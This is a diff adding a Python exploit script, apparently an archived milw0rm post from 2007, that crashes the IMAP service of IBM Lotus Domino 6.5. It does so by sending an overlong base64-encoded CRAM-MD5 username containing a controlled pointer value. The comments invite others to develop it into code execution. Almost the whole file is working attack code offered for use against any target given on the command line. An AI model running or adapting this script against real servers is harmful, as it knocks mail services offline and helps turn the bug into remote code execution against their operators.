@@ -1,0 +1,60 @@
+#!/usr/bin/python
+#
+# Remote DOS exploit code for IBM Lotus Domino Server 6.5. Tested on windows
+# 2000 server SP4. The code crashes the IMAP server. Since this is a simple DOS
+# where 256+ (but no more than 270) bytes for the username crashes the service
+# this is likely to work on other windows platform aswell. Maybe someone can carry this further and come out
+# with a code exec exploit.
+#
+# Author shall bear no reponsibility for any screw ups caused by using this code
+# Winny Thomas :-)
+#
+
+import sys
+import md5
+import struct
+import base64
+import socket
+
+def ExploitLotus(target):
+       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+       sock.connect((target, 143))
+       response = sock.recv(1024)
+       print response
+
+
+       auth = 'a001 authenticate cram-md5\r\n'
+       sock.send(auth)
+       response = sock.recv(1024)
+       print response
+
+       # prepare digest of the response from server
+       m = md5.new()
+       m.update(response[2:0])
+       digest = m.digest()
+
+       payload = 'A' * 256
+       # the following DWORD is stored in ECX
+       # at the time of overflow the following call is made
+       # call dword ptr [ecx]. However i couldnt find suitable conditions under which a stable pointer to our shellcode
+       # could be used. Actually i have not searched hard enough :-).
+       payload += struct.pack('<L', 0x58585858)
+
+       # Base64 encode the user info to the server
+       login = payload + ' ' + digest
+       login = base64.encodestring(login) + '\r\n'
+
+       sock.send(login)
+       response = sock.recv(1024)
+       print response
+
+if __name__=="__main__":
+       try:
+               target = sys.argv[1]
+       except IndexError:
+               print 'Usage: %s <imap server>\n' % sys.argv[0]
+               sys.exit(-1)
+
+       ExploitLotus(target)
+
+# milw0rm.com [2007-03-29]
